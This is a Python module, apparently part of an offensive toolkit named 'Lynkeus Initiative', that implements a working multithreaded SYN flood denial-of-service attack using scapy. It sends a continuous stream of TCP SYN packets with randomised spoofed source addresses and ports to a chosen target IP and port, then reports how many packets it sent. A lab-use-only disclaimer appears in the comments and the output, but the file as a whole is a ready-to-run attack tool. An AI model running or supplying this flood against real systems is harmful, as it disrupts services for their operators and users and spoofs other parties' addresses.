# modules/dos/syn_flood.py
# Lynkeus Initiative — SYN Flood
# Sends a high volume of TCP SYN packets to exhaust
# the target's connection table (half-open connections)
# Lab use only — run against machines you own

import random
import time
import threading

# Attempt to import scapy
try:
    from scapy.all import IP, TCP, send, conf
    conf.verb = 0
except ImportError:
    print ("[!] scapy is not installed. Run: pip install scapy")
    exit(1)

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET


# Global counters shared across threads
packet_count = 0
running      = True
lock         = threading.Lock()


def flood_worker(target_ip, target_port, timeout):

    # Worker thread — sends SYN packets continuously until stopped
    # Each packet uses a random source IP and source port
    # This simulates a spoofed flood from many different sources

    global packet_count, running

    while running:
        try:
            # Random source IP to simulate spoofed traffic
            src_ip   = ".".join(str(random.randint(1, 254)) for _ in range(4))

            # Random source port
            src_port = random.randint(1024, 65535)

            # Build SYN packet with spoofed source
            packet = IP(src=src_ip, dst=target_ip) / TCP(
                sport = src_port,
                dport = target_port,
                flags = "S",
                seq   = random.randint(0, 2**32 - 1)
            )

            send(packet, verbose=0)

            # Increment shared counter safely
            with lock:
                packet_count += 1

        except Exception:
            pass


def run_syn_flood(target_ip, target_port, duration, threads):

    # Launches the SYN flood for the given duration in seconds
    # Spawns multiple threads for higher packet volume
    # Stops automatically when duration expires

    global packet_count, running

    # Reset globals for a clean run
    packet_count = 0
    running      = True

    print ("")
    print (CYAN + "=" * 55 + RESET)
    print (BOLD + "  SYN FLOOD" + RESET)
    print (CYAN + "=" * 55 + RESET)
    print ("  Target   : " + BOLD + target_ip + ":" + str(target_port) + RESET)
    print ("  Duration : " + str(duration) + " seconds")
    print ("  Threads  : " + str(threads))
    print (RED + "  WARNING  : Lab use only. Do not use outside your lab." + RESET)
    print (CYAN + "-" * 55 + RESET)
    print ("")
    print (YELLOW + "  [*] Flood starting..." + RESET)
    print (DIM + "  Press Ctrl+C to stop early." + RESET)
    print ("")

    # Start all worker threads
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        workers.append(t)

    # Run for the specified duration, printing live count every second
    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
            elapsed = int(time.time() - start)
            with lock:
                current = packet_count
            print ("  [" + str(elapsed) + "s]  Packets sent: " + GREEN + str(current) + RESET)

    except KeyboardInterrupt:
        print ("")
        print (YELLOW + "  [!] Flood interrupted by user." + RESET)

    # Signal all threads to stop
    running = False

    # Wait for threads to finish
    for t in workers:
        t.join(timeout=2)

    # Final summary
    print ("")
    print (CYAN + "-" * 55 + RESET)
    print ("  " + BOLD + "Flood complete." + RESET)
    print ("  Total packets sent : " + GREEN + str(packet_count) + RESET)
    print ("  Duration           : " + str(duration) + " seconds")
    print ("  Avg packets/sec    : " + str(round(packet_count / duration, 1)))
    print (CYAN + "=" * 55 + RESET)
    print ("")
